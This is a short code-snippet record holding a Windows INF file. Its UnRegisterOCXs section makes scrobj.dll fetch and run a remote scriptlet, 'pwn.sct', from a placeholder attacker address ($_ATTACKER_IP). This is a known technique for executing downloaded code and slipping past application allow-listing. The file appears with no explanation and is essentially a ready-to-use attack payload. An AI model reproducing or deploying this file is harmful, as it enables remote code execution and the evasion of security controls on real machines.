---
id: 315f3e0c-34ee-46b6-830d-e370094ca829
type: code
language: INF File
verified: false
created_at: '2019-11-20T18:41:30.764224+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 315f3e0c

**Language**: INF File

```inf file
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```


